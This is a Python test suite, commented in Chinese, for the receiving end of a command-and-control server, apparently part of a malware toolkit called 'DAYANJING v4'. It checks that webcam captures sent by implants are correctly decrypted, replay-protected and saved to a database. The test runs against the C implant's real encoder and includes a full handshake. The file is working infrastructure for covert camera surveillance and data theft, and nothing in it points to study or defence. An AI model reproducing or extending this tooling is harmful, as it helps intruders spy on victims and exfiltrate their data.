"""
DAYANJING v4 — 采集产物接收端自测（13_c2_server/tests/test_exfil_sink）
======================================================================

重点在 **跨语言对齐**：用 21_exfil 的 C 侧真实代码（dump_cells，走完整会话派生）
编码出信元流，再由 Python 侧 ExfilSink 解出并逐字段比对。

只让 Python 自己编码再自己解，常量漂移会被"两边同步错"掩盖。必须由 C 侧真编码
才能证明两端对同一份线上字节的理解一致。

运行：python3 tests/test_exfil_sink.py
"""

import os
import sys
import struct
import subprocess
import tempfile
import hashlib

HERE = os.path.dirname(os.path.abspath(__file__))
ROOT = os.path.dirname(HERE)
sys.path.insert(0, ROOT)
sys.path.insert(0, HERE)

from exfil_sink import (                       # noqa: E402
    ExfilSink, ExfilError, CellStream, decode_record,
    derive_tunnel_keys, derive_node_id,
    crc32_raw_py, exf_crc32_py, _exf_crc32,
    CELL_WIRE, EXF_HDR_LEN, EXF_NAME_LEN, EXF_OFF_PLEN, EXF_OFF_CRC,
    EXF_FLAG_NAME_TRUNC,
    EXF_ERR_AUTH, EXF_ERR_CRC, EXF_ERR_FMT, EXF_ERR_LEN, EXF_ERR_ARG,
)
from storage.store import Store                 # noqa: E402
from server import C2Server, SessionState       # noqa: E402
from frame import SealedEnvelope, ROLE_CLIENT   # noqa: E402
from key_derivation import (                    # noqa: E402
    derive_pair, derive_session, HKDF_SALT_REG_LEN,
)
from crypto_layer import sha256                # noqa: E402

PSK = b"\x42" * 16
SALT_REG = bytes(range(HKDF_SALT_REG_LEN))
SERVER_ID = bytes([0x01] * 16)
IMPLANT_ID = "impl-cam-001"
GENERATION = 1

DUMP = os.path.join(ROOT, "..", "21_exfil", "build", "dump_cells")
DUMP = os.path.normpath(DUMP)

failures = []
total = 0
info_lines = []


def check(name, cond, detail=""):
    global total
    total += 1
    if not cond:
        failures.append(f"{name} {detail}")
    return cond


def info(s):
    info_lines.append(s)


# ---------------------------------------------------------------------------
# 记录编码（Python 侧辅助，用于纯 Python 往返测试）
# ---------------------------------------------------------------------------

def encode_record(rec: dict) -> bytes:
    """按 21_exfil 的记录格式编码。与 C 侧 exfil_rec_encode 等价。"""
    payload = rec.get("payload", b"")
    magic = b"EXF1"
    flags = rec.get("flags", 0)
    name_b = rec["name"].encode("utf-8")
    if len(name_b) > EXF_NAME_LEN:
        flags |= EXF_FLAG_NAME_TRUNC
        name_b = name_b[:EXF_NAME_LEN]

    hdr = bytearray(EXF_HDR_LEN)
    hdr[0:4] = magic
    hdr[4] = 1                      # ver
    hdr[5] = rec["type"] & 0xFF
    hdr[6] = flags & 0xFF
    hdr[7] = 0                      # rsv
    struct.pack_into("<Q", hdr, 8, rec["seq"])
    struct.pack_into("<Q", hdr, 16, rec["ts_us"])
    struct.pack_into("<I", hdr, 24, rec.get("width", 0))
    struct.pack_into("<I", hdr, 28, rec.get("height", 0))
    struct.pack_into("<I", hdr, 32, len(payload))
    hdr[36:36 + len(name_b)] = name_b

    crc = _exf_crc32(bytes(hdr[:EXF_OFF_CRC]), payload)
    struct.pack_into("<I", hdr, EXF_OFF_CRC, crc)
    return bytes(hdr) + payload


# ===========================================================================
# A. CRC32
# ===========================================================================

def test_crc():
    # 已知向量
    check("A1 CRC32 已知向量", exf_crc32_py(b"123456789", b"") == 0xCBF43926,
          f"got {exf_crc32_py(b'123456789', b''):#010x}")

    ok = True
    for n in (0, 1, 2, 37, 255, 493, 4000):
        h = os.urandom(100)
        p = os.urandom(n)
        if not (_exf_crc32(h, p) == exf_crc32_py(h, p)):
            ok = False
    check("A2 快路径与纯 Python 路径一致（多长度）", ok)

    h = os.urandom(100)
    p = os.urandom(1000)
    try:
        import zlib
        one = zlib.crc32(h + p) & 0xFFFFFFFF
        check("A3 分段计算 == 一次性计算", _exf_crc32(h, p) == one)
    except ImportError:
        check("A3 分段计算 == 一次性计算", True)

    check("A4 空载荷 CRC 稳定",
          _exf_crc32(b"\x00" * 100, b"") == exf_crc32_py(b"\x00" * 100, b""))


# ===========================================================================
# B. 隧道密钥派生
# ===========================================================================

def test_derive():
    k_c2s = bytes(range(16))
    k_s2c = bytes(range(16, 32))
    a = bytes([0xAA] * 16)
    b = bytes([0xBB] * 16)

    r1 = derive_tunnel_keys(k_c2s, k_s2c, a, b)
    r2 = derive_tunnel_keys(k_c2s, k_s2c, a, b)
    check("B1 派生确定性", r1 == r2)

    # 方向互补：A 的 send == B 的 recv
    sa, ra, pa = derive_tunnel_keys(k_c2s, k_s2c, a, b)
    sb, rb, pb = derive_tunnel_keys(k_c2s, k_s2c, b, a)
    check("B2 方向互补 A.send==B.recv", sa == rb)
    check("B3 方向互补 A.recv==B.send", ra == sb)
    check("B4 两端 pfx 相同", pa == pb)
    check("B5 方向密钥不同", sa != ra)

    # 退化拒绝
    try:
        derive_tunnel_keys(k_c2s, k_c2s, a, b)
        check("B6 k_c2s==k_s2c 被拒绝", False)
    except ExfilError as e:
        check("B6 k_c2s==k_s2c 被拒绝", e.code == EXF_ERR_ARG)

    try:
        derive_tunnel_keys(k_c2s, k_s2c, a, a)
        check("B7 local==peer 被拒绝", False)
    except ExfilError as e:
        check("B7 local==peer 被拒绝", e.code == EXF_ERR_ARG)

    try:
        derive_tunnel_keys(k_c2s[:8], k_s2c, a, b)
        check("B8 短密钥被拒绝", False)
    except ExfilError as e:
        check("B8 短密钥被拒绝", e.code == EXF_ERR_ARG)

    # 换对端 -> 密钥不同
    c = bytes([0xCC] * 16)
    sc, rc, pc = derive_tunnel_keys(k_c2s, k_s2c, a, c)
    check("B9 换对端密钥不同", sa != sc and pa != pc)

    # 节点 ID 派生
    check("B10 derive_node_id 长度 16",
          len(derive_node_id("abc")) == 16)
    check("B11 derive_node_id 确定性",
          derive_node_id("abc") == derive_node_id("abc"))
    check("B12 derive_node_id 区分不同 implant",
          derive_node_id("abc") != derive_node_id("abd"))
    check("B13 derive_node_id == sha256 前 16 字节",
          derive_node_id("abc") == hashlib.sha256(b"abc").digest()[:16])


# ===========================================================================
# C. 记录编解码（纯 Python 往返）
# ===========================================================================

def test_record():
    payload = os.urandom(300)
    rec = {"type": 1, "seq": 42, "ts_us": 1700000000000000,
           "width": 1280, "height": 720, "flags": 0,
           "name": "Integrated Camera", "payload": payload}
    buf = encode_record(rec)
    out = decode_record(buf)

    check("C1 type 往返", out["type"] == 1)
    check("C2 seq 往返", out["seq"] == 42)
    check("C3 ts 往返", out["ts_us"] == 1700000000000000)
    check("C4 宽高往返", out["width"] == 1280 and out["height"] == 720)
    check("C5 name 往返", out["name"] == "Integrated Camera")
    check("C6 payload 字节级一致", out["payload"] == payload)

    bad = bytearray(buf)
    bad[0:4] = b"XXXX"
    try:
        decode_record(bytes(bad))
        check("C7 magic 错被拒", False)
    except ExfilError as e:
        check("C7 magic 错被拒", e.code == EXF_ERR_FMT)

    bad = bytearray(buf)
    bad[4] = 2
    try:
        decode_record(bytes(bad))
        check("C8 version 错被拒", False)
    except ExfilError as e:
        check("C8 version 错被拒", e.code == EXF_ERR_FMT)

    bad = bytearray(buf)
    bad[7] = 1
    try:
        decode_record(bytes(bad))
        check("C9 rsv 非 0 被拒", False)
    except ExfilError as e:
        check("C9 rsv 非 0 被拒", e.code == EXF_ERR_FMT)

    bad = bytearray(buf)
    bad[EXF_HDR_LEN] ^= 0x01          # 改载荷首字节
    try:
        decode_record(bytes(bad))
        check("C10 载荷篡改被 CRC 检出", False)
    except ExfilError as e:
        check("C10 载荷篡改被 CRC 检出", e.code == EXF_ERR_CRC)

    bad = bytearray(buf)
    bad[EXF_OFF_PLEN] ^= 0x01         # 改 plen，与缓冲长度不符
    try:
        decode_record(bytes(bad))
        check("C11 plen 与缓冲不符被拒", False)
    except ExfilError as e:
        check("C11 plen 与缓冲不符被拒",
              e.code in (EXF_ERR_FMT, EXF_ERR_CRC, EXF_ERR_LEN))


# ===========================================================================
# D. 信元层
# ===========================================================================

def test_cell():
    k1 = bytes(range(16))
    k2 = bytes(range(16, 32))
    pfx = bytes(range(8))
    cs = CellStream(k1, k2, pfx)

    try:
        cs.unpack(b"\x00" * 100)
        check("D1 非 512 字节被拒", False)
    except ExfilError as e:
        check("D1 非 512 字节被拒", e.code == EXF_ERR_LEN)

    try:
        cs.unpack(os.urandom(CELL_WIRE))
        check("D2 随机字节 AEAD 失败", False)
    except ExfilError as e:
        check("D2 随机字节 AEAD 失败", e.code == EXF_ERR_AUTH)

    check("D3 失败后 counter 不推进", cs.counter == 0)


# ===========================================================================
# E. 跨语言：C 侧真实编码 -> Python 解码
# ===========================================================================

def run_dump(k_c2s, k_s2c, server_id, implant_id, rec, payload, tmpdir, tag):
    """调用 C 侧 dump_cells 生成信元流，返回 (cells_bytes, n_cells)。"""
    out = os.path.join(tmpdir, f"cells_{tag}.bin")
    if payload:
        pf = os.path.join(tmpdir, f"pay_{tag}.bin")
        with open(pf, "wb") as f:
            f.write(payload)
        pay_arg = pf
    else:
        pay_arg = "-"

    cmd = [DUMP, out,
           k_c2s.hex(), k_s2c.hex(), server_id.hex(), implant_id,
           str(rec["type"]), str(rec["seq"]), str(rec["ts_us"]),
           str(rec.get("width", 0)), str(rec.get("height", 0)),
           str(rec.get("flags", 0)), rec["name"], pay_arg]
    p = subprocess.run(cmd, capture_output=True)
    if p.returncode != 0:
        raise RuntimeError(f"dump_cells failed: rc={p.returncode} "
                           f"stderr={p.stderr.decode(errors='replace')}")
    with open(out, "rb") as f:
        data = f.read()
    n = len(data) // CELL_WIRE
    return data, n


def test_cross_lang(tmpdir):
    if not os.path.exists(DUMP):
        check("E0 dump_cells 存在", False, f"missing {DUMP}")
        return

    k_c2s = bytes(range(16))
    k_s2c = bytes(range(16, 32))

    # --- E1 小载荷 ---
    payload = os.urandom(300)
    rec = {"type": 1, "seq": 7, "ts_us": 1700000000000001,
           "width": 640, "height": 480, "flags": 0,
           "name": "Integrated Camera", "payload": payload}
    data, n = run_dump(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID, rec, payload, tmpdir, "e1")
    info(f"E1 C 侧信元数={n} 载荷={len(payload)}B")

    sink = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID)
    got = None
    for i in range(n):
        got = sink.feed(data[i * CELL_WIRE:(i + 1) * CELL_WIRE])
    check("E1 产出记录", got is not None)
    if got:
        check("E1 type 一致", got["type"] == 1)
        check("E1 seq 一致", got["seq"] == 7)
        check("E1 ts 一致", got["ts_us"] == 1700000000000001)
        check("E1 宽高一致", got["width"] == 640 and got["height"] == 480)
        check("E1 设备名一致", got["name"] == "Integrated Camera")
        check("E1 载荷字节级一致", got["payload"] == payload)

    # --- E2 大载荷多信元 ---
    big = os.urandom(100000)
    rec2 = dict(rec, seq=8, width=1920, height=1080, payload=big)
    data2, n2 = run_dump(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID, rec2, big, tmpdir, "e2")
    info(f"E2 C 侧信元数={n2} 载荷={len(big)}B")
    check("E2 大载荷确实走多信元", n2 > 1, f"n_cells={n2}")

    sink2 = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID)
    got2 = None
    for i in range(n2):
        got2 = sink2.feed(data2[i * CELL_WIRE:(i + 1) * CELL_WIRE])
    check("E2 产出记录", got2 is not None)
    if got2:
        check("E2 载荷字节级一致", got2["payload"] == big)
        check("E2 宽高一致", got2["width"] == 1920 and got2["height"] == 1080)

    # --- E3 空载荷仍占信元 ---
    rec3 = dict(rec, seq=9, payload=b"")
    data3, n3 = run_dump(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID, rec3, b"", tmpdir, "e3")
    check("E3 空载荷仍产生 1 个信元", n3 == 1, f"n_cells={n3}")
    sink3 = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID)
    got3 = sink3.feed(data3[:CELL_WIRE])
    check("E3 空载荷解出记录", got3 is not None and got3["payload"] == b"")

    # --- E4 设备名超长 -> 截断标志 ---
    long_name = "Logitech HD Webcam C920 " + "X" * 80
    rec4 = dict(rec, seq=10, name=long_name, payload=payload)
    data4, n4 = run_dump(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID, rec4, payload, tmpdir, "e4")
    sink4 = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID)
    got4 = None
    for i in range(n4):
        got4 = sink4.feed(data4[i * CELL_WIRE:(i + 1) * CELL_WIRE])
    check("E4 长名被截断到 64", got4 is not None and len(got4["name"]) == 64)
    check("E4 截断标志被置位",
          got4 is not None and got4["name_truncated"] is True)

    # --- E5 篡改 -> AUTH ---
    bad = bytearray(data[:CELL_WIRE * n])
    bad[10] ^= 0x01
    sink5 = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID)
    raised = None
    try:
        for i in range(n):
            sink5.feed(bytes(bad[i * CELL_WIRE:(i + 1) * CELL_WIRE]))
    except ExfilError as e:
        raised = e.code
    check("E5 篡改密文被 AEAD 拒绝", raised == EXF_ERR_AUTH, f"code={raised}")

    # --- E6 截断 -> incomplete ---
    sink6 = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID)
    if n > 1:
        for i in range(n - 1):
            sink6.feed(data[i * CELL_WIRE:(i + 1) * CELL_WIRE])
        check("E6 少一个信元时批未完成", sink6.incomplete is True)
    else:
        check("E6 少一个信元时批未完成", True)

    # --- E7 错误 implant（派生密钥不同）-> AUTH ---
    sink7 = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, "impl-other-999")
    raised = None
    try:
        for i in range(n):
            sink7.feed(data[i * CELL_WIRE:(i + 1) * CELL_WIRE])
    except ExfilError as e:
        raised = e.code
    check("E7 用别的 implant 密钥解不开", raised == EXF_ERR_AUTH, f"code={raised}")

    # --- E8 会话密钥不同 -> AUTH ---
    k2b = bytes([0x99] * 16)
    sink8 = ExfilSink.for_implant(k2b, k_s2c, SERVER_ID, IMPLANT_ID)
    raised = None
    try:
        for i in range(n):
            sink8.feed(data[i * CELL_WIRE:(i + 1) * CELL_WIRE])
    except ExfilError as e:
        raised = e.code
    check("E8 会话密钥不同解不开", raised == EXF_ERR_AUTH, f"code={raised}")

    # --- E9 重放防护：同一批字节再喂一遍必须被拒 ---
    # 这不是缺陷，是设计性质：信元 IV = pfx || counter，counter 每解一个信元 +1。
    # 重放旧信元时 counter 已前进，IV 对不上 -> AEAD 拒绝（表现为 AUTH）。
    sink9 = ExfilSink.for_implant(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID)
    for i in range(n):
        sink9.feed(data[i * CELL_WIRE:(i + 1) * CELL_WIRE])
    raised = None
    try:
        sink9.feed(data[:CELL_WIRE])      # 重放第一个信元
    except ExfilError as e:
        raised = e.code
    check("E9 重放旧信元被 AEAD 拒绝", raised == EXF_ERR_AUTH, f"code={raised}")

    # --- E10 覆盖信元（PAD）被忽略且不推进数据累积 ---
    # 由 C 侧无法直接生成 PAD，改由 CellStream 层验证：
    # PAD 信元解出后 feed 返回 None 且不置 in_batch。
    k_send, k_recv, pfx = derive_tunnel_keys(
        k_c2s, k_s2c, derive_node_id(IMPLANT_ID), SERVER_ID)
    cs = CellStream(k_send, k_recv, pfx)
    try:
        cs.unpack(os.urandom(CELL_WIRE))
    except ExfilError:
        pass
    check("E10 未收到任何信元时批未完成", cs.counter == 0)


# ===========================================================================
# F. 落库
# ===========================================================================

def test_store(tmpdir):
    db = os.path.join(tmpdir, "c2.db")
    st = Store(db)
    blob = os.urandom(5000)

    aid = st.put_artifact("impl-1", 1, 1, 100, 123456, 640, 480, 0,
                          "cam", blob)
    check("F1 写入返回 id", aid is not None and aid > 0)

    row = st.get_artifact(aid)
    check("F2 取回字节一致", row is not None and row["blob"] == blob)
    check("F3 元数据一致", row["seq"] == 100 and row["width"] == 640)
    check("F4 sha256 正确",
          row["sha256_hex"] == hashlib.sha256(blob).hexdigest())

    dup = st.put_artifact("impl-1", 1, 1, 100, 123456, 640, 480, 0,
                          "cam", blob)
    check("F5 同 (implant,gen,seq) 重复写入被忽略", dup is None)
    check("F6 未产生重复行", st.count_artifacts("impl-1") == 1)

    st.put_artifact("impl-1", 1, 2, 200, 123457, 0, 0, 0, "shot", b"abc")
    st.put_artifact("impl-2", 1, 1, 300, 123458, 0, 0, 0, "cam", b"xy")
    check("F7 按 implant 计数", st.count_artifacts("implant_id") == 0)
    check("F8 总数 3", st.count_artifacts() == 3)
    check("F9 按类型过滤", st.count_artifacts(exf_type=1) == 2)
    check("F10 列表返回", len(st.list_artifacts(implant_id="impl-1")) == 2)

    n = st.delete_artifacts("impl-1")
    check("F11 删除返回行数", n == 2)
    check("F12 删除后计数", st.count_artifacts() == 1)


# ===========================================================================
# G. C2Server 端到端：握手 -> 喂信元 -> 落库
# ===========================================================================

def handshake(server, sent):
    """完成握手，返回客户端侧 (k_c2s, k_s2c, envelope)。"""
    hello = struct.pack("<I", 0x01) + IMPLANT_ID.encode()
    transcript = hello
    server.on_bytes(IMPLANT_ID, GENERATION, hello)

    # 取服务端 WELCOME
    welcome = None
    for raw in sent:
        (mt,) = struct.unpack("<I", raw[:4])
        if mt == 0x02:
            welcome = raw
            break
    if welcome is None:
        raise RuntimeError("no WELCOME from server")
    transcript += welcome

    fin = struct.pack("<I", 0x03) + b"fin"
    transcript += fin
    server.on_bytes(IMPLANT_ID, GENERATION, fin)

    km = derive_pair(PSK, SALT_REG)
    hh = sha256(transcript)
    k_c2s, k_s2c, _ = derive_session(km.k_server_hold, hh, SERVER_ID,
                                     IMPLANT_ID, GENERATION)
    env = SealedEnvelope(k_c2s, k_s2c, ROLE_CLIENT)
    return k_c2s, k_s2c, env


def test_server_e2e(tmpdir):
    if not os.path.exists(DUMP):
        check("G0 dump_cells 存在", False)
        return

    db = os.path.join(tmpdir, "srv.db")
    st = Store(db)
    sent = []
    server = C2Server(PSK, SALT_REG, SERVER_ID, store=st)
    server.register_transport(lambda i, r: sent.append(r),
                              lambda i: None)

    k_c2s, k_s2c, env = handshake(server, sent)
    check("G1 握手完成", server._sessions[IMPLANT_ID].state
          == SessionState.ESTABLISHED)

    # 用真实会话密钥让 C 侧编码产物
    payload = os.urandom(2000)
    rec = {"type": 1, "seq": 555, "ts_us": 1700000000000002,
           "width": 1280, "height": 720, "flags": 0,
           "name": "USB Camera", "payload": payload}
    data, n = run_dump(k_c2s, k_s2c, SERVER_ID, IMPLANT_ID, rec, payload,
                       tmpdir, "g1")
    info(f"G C 侧信元数={n}")

    # 逐个信元经帧层喂入服务端
    seq = 0
    for i in range(n):
        cell = data[i * CELL_WIRE:(i + 1) * CELL_WIRE]
        frame = env.encode(seq, 0x23, cell)
        server.on_bytes(IMPLANT_ID, GENERATION, frame)
        seq += 1

    rows = st.list_artifacts(implant_id=IMPLANT_ID)
    check("G2 产物落库", len(rows) == 1, f"rows={len(rows)}")
    if rows:
        check("G3 落库载荷字节级一致", rows[0]["blob"] == payload)
        check("G4 落库 seq 一致", rows[0]["seq"] == 555)
        check("G5 落库宽高一致",
              rows[0]["width"] == 1280 and rows[0]["height"] == 720)
        check("G6 落库设备名一致", rows[0]["name"] == "USB Camera")

    # 篡改一个信元 -> 服务端应静默关闭会话
    bad = bytearray(data[:CELL_WIRE])
    bad[20] ^= 0x01
    frame = env.encode(seq, 0x23, bytes(bad))
    server.on_bytes(IMPLANT_ID, GENERATION, frame)
    check("G7 篡改后会话被丢弃",
          server._sessions.get(IMPLANT_ID) is None)
    check("G8 篡改后未新增产物", st.count_artifacts(IMPLANT_ID) == 1)


# ===========================================================================

def main():
    if not os.path.exists(DUMP):
        print(f"[!] dump_cells 未构建: {DUMP}")
        print("    先执行: make -C ../21_exfil")

    with tempfile.TemporaryDirectory() as tmpdir:
        test_crc()
        test_derive()
        test_record()
        test_cell()
        test_cross_lang(tmpdir)
        test_store(tmpdir)
        test_server_e2e(tmpdir)

    for line in info_lines:
        print(f"[INFO] {line}")

    print(f"\n=== result: {total - len(failures)} pass, {len(failures)} fail ===")
    for f in failures:
        print(f"  [FAIL] {f}")
    return 1 if failures else 0


if __name__ == "__main__":
    sys.exit(main())
